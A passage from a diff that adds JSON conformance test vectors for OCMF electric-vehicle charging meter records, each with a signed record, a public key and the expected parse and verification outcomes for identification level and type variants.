+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-level-UNKNOWN",
+   "group": "table",
+   "description": "IL = UNKNOWN [OCMF Tab. 11]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"UNKNOWN\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100FF35B23696EEA847A13A3BFEEFE667477F4FBF7DEC773CB70CA03FCAF319F3660220297AC1C3EC9A971567A646A1558D5D3CFB91200A3DE787529D740DF1D46C62E2\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-NONE",
+   "group": "table",
+   "description": "IT = NONE, with an ID of the shape that row prescribes [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"NONE\",\"ID\":\"\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402206F29AFD5734436AB5276F5E6CEDD8A53E43EC10403890E87DFD40576A1B6835B02201967ED89DAFDAAA474D27A52ADC688A4DC04E4B7AB6B9A87E3744E5434499EC1\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-DENIED",
+   "group": "table",
+   "description": "IT = DENIED, with an ID of the shape that row prescribes [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"DENIED\",\"ID\":\"\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304502210096BFE437484D1FCFBED0728BC7BCCBE40A863749A17E1416495BB3A27F0794CF02205735045228B3DA5E8D77531429945959F29FA7D04103A06C77ADF6BCB524DE3D\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-UNDEFINED",
+   "group": "table",
+   "description": "IT = UNDEFINED, with an ID of the shape that row prescribes [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"UNDEFINED\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100F9566C1754045459B341BC322558BC0C23F462EA9F9765F2CF4D5A8C1D1BC59102207773C090ED454901F8EC145794CF88EA0A9E1C95F1D15F13D6EE353B9D47A8B3\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-ISO14443",
+   "group": "table",
+   "description": "IT = ISO14443, with an ID of the shape that row prescribes [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100E1834E24BB331913FE72059FD1C588698CE066EEB11A89A1BA38429F85C0F0F40220455194C22931D4D16580C3033DF6497BA656DBD1BD728710CC3D9FCC0BF9AE12\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-ISO15693",
+   "group": "table",
+   "description": "IT = ISO15693, with an ID of the shape that row prescribes [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO15693\",\"ID\":\"1F2D3A4F5506C7A9\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402204B370DFE22A8BB12517AFBE11453E103E3C0730E824BCB06000922FDE011070302203D5E10C0D8FCD8BFF2CC98AD23AC76804E873E43CC8B42FC21B82706E5960989\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-EMAID",
+   "group": "table",
+   "description": "IT = EMAID, with an ID of the shape that row prescribes [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"EMAID\",\"ID\":\"DE8ACC12E4F3R7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30440220647531E4B02B4C92736FDEB52CD34BD59406D32E9D4C0972362DEC1E661517C302203D1F94DB75B73389D064C171E4DDB35E6B77CA116F96F29A4D4F711431851C76\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-EVCCID",
+   "group": "table",
+   "description": "IT = EVCCID, with an ID of the shape that row prescribes [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"EVCCID\",\"ID\":\"ABC123\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402206BAB0C4DBB9127BC08421D45F7167D07447F9E9C45A03D2C9A7310AD868CB24B02201F7C7AAE2BEECB2CA48503FE68F033C5756D4E9C393D2D5FA8DEEA764AE5CE08\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-EVCOID",
+   "group": "table",
+   "description": "IT = EVCOID, with an ID of the shape that row prescribes [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"EVCOID\",\"ID\":\"DE-8AC-C12E4F3R7-2\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100A830FF1864BB128261513641D78D1AE8E34D0C9413EC40B5B0544F15013098DB022031A9B3BE6CDEF1CCB3233BF33FFBB9BCB8CED9665CF61DA85FE7B25852B238C7\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-ISO7812",
+   "group": "table",
+   "description": "IT = ISO7812, with an ID of the shape that row prescribes [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO7812\",\"ID\":\"4111111111111111\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30450221008D47E57A8C606D16DAB24EAEC6D85F62C5A8ADCD66C6E6933F01E7D2E6E397C8022074E953808CF6844BA40AE81425A644EC0A1AB085DD5B39931AAC1635C8D6824F\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-CARD_TXN_NR",
+   "group": "table",
+   "description": "IT = CARD_TXN_NR, with an ID of the shape that row prescribes [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"CARD_TXN_NR\",\"ID\":\"0000012345\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402204E439A72F1DE059C974B9B70A9B98D7F5378680807117276D04FEFEB7A5C700502205A19119FE957AB1885AD03B0AD8F607B02F82487C9E00ACECE650ADF222199B5\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-CENTRAL",
+   "group": "table",
+   "description": "IT = CENTRAL, with an ID of the shape that row prescribes [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"CENTRAL\",\"ID\":\"0f2b1c4a-6d3e-4f19-9a7c-2e5b8d1f0a63\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022008BCB84901D02784A65744CA72B274DEB8B6D22D7C1E36B639D1C2A1B71F2D8002201D1C07432CAF8103F5C7CB7E23C5EE39DC9D8B9A511183B37B6420DF28D01196\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-CENTRAL_1",
+   "group": "table",
+   "description": "IT = CENTRAL_1, with an ID of the shape that row prescribes [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"CENTRAL_1\",\"ID\":\"SMS-4711\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100C44C3E77163DABB6D4BFBDE6644DB9F5B4210E4681D595A9D1BC3681C9AEFE8D022065D30FA808BB62015908CA4222DBDE99384B8C85DF31FD91E044AC47E3A3B255\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-CENTRAL_2",
+   "group": "table",
+   "description": "IT = CENTRAL_2, with an ID of the shape that row prescribes [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"CENTRAL_2\",\"ID\":\"OP-START-4711\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100AE6BAFF1F56530611636C9B50C6B4A354F9DB7B792002B59F3387ECC57D4259D02203E16A0830F6B38B8087B58D4C0FEE81B3827A6FCCBDEBDD1FDA8F990D3BE2893\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-LOCAL",
+   "group": "table",
+   "description": "IT = LOCAL, with an ID of the shape that row prescribes [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"LOCAL\",\"ID\":\"a5f3c1d2-9b8e-4c07-8f6a-1d4e2b9c7053\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100C3A7F9680BF7122318E7A122FBE1586DA4F5F9BD8140966A91B95B28DEE473B302206795C7A1F9A005E5291EAEB4D45DF8186DB44ACACB99EC7940C7CEF711738EB1\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-LOCAL_1",
+   "group": "table",
+   "description": "IT = LOCAL_1, with an ID of the shape that row prescribes [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"LOCAL_1\",\"ID\":\"CP-LOCAL-0001\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30450221009FC3619733599F077A8B6676F7975DD4EC9F7C9A79DBBFFFE151F2611BDC37DB02200A9761F5E600CA8F49BD19230140C27B336CCF6B86A2A689EC01FBF8E4BD40BF\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-LOCAL_2",
+   "group": "table",
+   "description": "IT = LOCAL_2, with an ID of the shape that row prescribes [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"LOCAL_2\",\"ID\":\"OTHER-0001\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30450221009B87BF4FEC64EFE73BB15D8653FA999D601E0A1D74BBF6B81308CB6FDA1088D202207074923CBEBF080F4FEE609235209B2539019D168B2E04B25C886CCF8BEBE567\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/id-type-PHONE_NUMBER",
+   "group": "table",
+   "description": "IT = PHONE_NUMBER, with an ID of the shape that row prescribes [OCMF Tab. 17]",
